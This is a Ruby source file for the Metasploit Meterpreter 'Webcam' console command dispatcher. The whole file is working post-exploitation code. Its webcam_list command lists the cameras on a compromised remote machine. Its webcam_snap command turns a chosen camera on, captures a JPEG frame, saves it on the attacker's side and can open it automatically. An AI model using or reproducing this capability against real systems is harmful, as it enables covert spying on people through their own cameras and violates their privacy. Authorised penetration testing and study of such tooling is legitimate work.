require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Webcam - Capture video from the remote system
#
###
class Console::CommandDispatcher::Webcam

	Klass = Console::CommandDispatcher::Webcam

	include Console::CommandDispatcher

	#
	# Initializes an instance of the webcam command interaction.
	#
	def initialize(shell)
		super
	end

	#
	# List of supported commands.
	#
	def commands
		{
			"webcam_list"   => "List webcams",
			"webcam_snap"   => "Take a snapshot from the specified webcam"
		}
	end

	def cmd_webcam_list
		client.webcam.webcam_list.each_with_index { |name, indx| 
			print_line("#{indx + 1}: #{name}")
		}
		return true
	end

	def cmd_webcam_snap(*args)
		path    = Rex::Text.rand_text_alpha(8) + ".jpeg"
		quality = 50
		view    = true
		index   = 1
		
		webcam_snap_opts = Rex::Parser::Arguments.new(
			"-h" => [ false, "Help Banner" ],
			"-i" => [ true, "The index of the webcam to use (Default: 1)" ],
			"-q" => [ true, "The JPEG image quality (Default: '#{quality}')" ],
			"-p" => [ true, "The JPEG image path (Default: '#{path}')" ],
			"-v" => [ true, "Automatically view the JPEG image (Default: '#{view}')" ]
		)

		webcam_snap_opts.parse( args ) { | opt, idx, val |
			case opt
				when "-h"
					print_line( "Usage: webcam_snap [options]\n" )
					print_line( "Grab a frame from the specified webcam." )
					print_line( webcam_snap_opts.usage )
					return
				when "-i"
					index = val.to_i
				when "-q"
					quality = val.to_i
				when "-p"
					path = val
				when "-v"
					view = false if ( val =~ /^(f|n|0)/i )
			end
		}

		print_line("[*] Starting...")
		client.webcam.webcam_start(index)
		data = client.webcam.webcam_get_frame(quality)
		print_line("[*] Got frame")
		client.webcam.webcam_stop
		print_line("[*] Stopped")

		if( data )
			::File.open( path, 'wb' ) do |fd|
				fd.write( data )
			end
			path = ::File.expand_path( path )
			print_line( "Webcam shot saved to: #{path}" )
			Rex::Compat.open_file( path ) if view
		end
		return true
	end

	#
	# Name for this dispatcher
	#
	def name
		"Webcam"
	end

end

end
end
end
end

